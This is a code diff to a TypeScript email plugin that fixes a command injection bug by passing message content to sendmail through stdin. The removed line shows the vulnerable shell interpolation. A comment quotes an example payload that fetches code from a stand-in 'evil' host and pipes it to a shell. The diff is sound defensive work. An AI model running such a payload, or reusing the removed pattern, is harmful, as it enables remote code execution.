@@ -69,6 +69,24 @@ export class EmailPlugin extends BasePlugin {
     return [...this.emails].sort((a, b) => b.timestamp - a.timestamp);
   }
 
+  /**
+   * Builds sendmail's invocation the safe way: the MIME content is handed to
+   * the child process via stdin (execSync's `input` option), never
+   * interpolated into the shell command string itself. The previous
+   * implementation embedded email.from/to/subject/body directly into a
+   * `echo "..." | sendmail ...` shell command with only `"` escaped --
+   * backticks and $() are still interpreted by the shell inside double
+   * quotes, so any of those fields containing e.g. `` `curl evil/x|sh` ``
+   * was a real command injection, not just a theoretical one, the moment
+   * anything called send() with attacker-influenced content. sendmailPath
+   * itself is still safe to put in the command string: it only ever comes
+   * from which() resolving one of a fixed set of literal binary names, never
+   * user input.
+   */
+  private buildSendmailInvocation(mime: string, sendmailPath: string): { command: string; input: string } {
+    return { command: `${sendmailPath} -t -i`, input: mime };
+  }
+
   private trySendmail(email: Email): boolean {
     const sendmailPath = this.which('sendmail') || this.which('ssmtp') || this.which('msmtp');
     if (!sendmailPath) return false;
@@ -86,7 +104,8 @@ export class EmailPlugin extends BasePlugin {
         email.body,
       ].join('\r\n');
 
-      execSync(`echo "${mime.replace(/"/g, '\\"')}" | ${sendmailPath} -t -i`, { timeout: 10000 });
+      const { command, input } = this.buildSendmailInvocation(mime, sendmailPath);
+      execSync(command, { timeout: 10000, input });
       return true;
     } catch {
       return false;
